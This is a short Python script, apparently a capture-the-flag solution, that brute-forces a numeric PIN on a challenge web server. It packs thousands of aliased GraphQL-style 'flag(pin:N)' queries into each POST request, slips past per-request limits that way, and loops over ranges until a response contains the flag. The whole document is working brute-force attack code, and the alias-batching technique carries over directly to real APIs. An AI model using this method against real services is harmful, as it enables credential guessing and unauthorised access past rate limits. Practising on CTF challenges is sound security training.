import requests, json

min = 0
max = 10000

def batch_loop(min, max):
    data = ''
    for x in range(min,max,1):
        data = data + f'batch{x+1}:flag(pin:{x})\r\n'

    return data

headers = {
    'Content-Type': 'text/plain;charset=UTF-8',
}

while True:
    data = batch_loop(min, max)
    data_g = '{\n'+data+'\n}'

    r = requests.post('https://web-force-force-ccc7ec459c6ee0ab.be.ax/',headers=headers,data=data_g)

    if 'corctf' in r.text:
        df = open('flag_response.txt','w')
        df.write(r.text)

        jsonFormat = json.loads(r.text)

        for key, val in jsonFormat['data'].items():
            if val != 'Wrong!':
                print(f'flag: {val}')

        break
    
    min = min + 10000
    max = max + 10000
    
    if max > 100000:
        print('failed.')
        break
    else:
        print('retrying...')